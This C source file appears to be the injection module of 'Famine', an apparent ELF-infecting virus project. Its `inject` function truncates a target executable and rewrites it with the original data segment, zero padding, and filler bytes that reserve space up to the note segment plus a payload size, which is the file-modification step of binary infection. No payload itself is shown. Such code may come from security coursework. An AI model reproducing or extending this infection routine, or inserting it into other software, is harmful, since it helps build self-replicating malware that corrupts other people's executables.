#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline void defer(int *fd)
{
	_close(*fd);
}

static void write_on_memory(const struct elf *file, char *ptr)
{
	register unsigned long index = 0;
	char *dst = ptr;
	char *src = file->ptr;
	
	while (index < file->data->p_offset + file->data->p_filesz)
	{
		*dst++ = *src++;
		index++;
	}
	while (index < file->data->p_offset + file->data->p_filesz + file->offs_padding)
	{
		*dst++ = 0;
		index++;
	}
	while (index < file->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 42;
		index++;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(const struct elf *file, const char *filename)
{
	__attribute__((cleanup(defer))) int fd = 0;
	char *ptr;

	if ((fd = _open(filename, O_RDWR | O_CREAT | O_TRUNC, 0744)) == -1)
		return ;
	if ((ptr = _mmap(NULL, file->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return ;

	write_on_memory(file, ptr);
	_write(fd, ptr, file->note->p_offset + PAYLOAD_SIZE);

	_munmap(ptr, file->note->p_offset + PAYLOAD_SIZE);
}
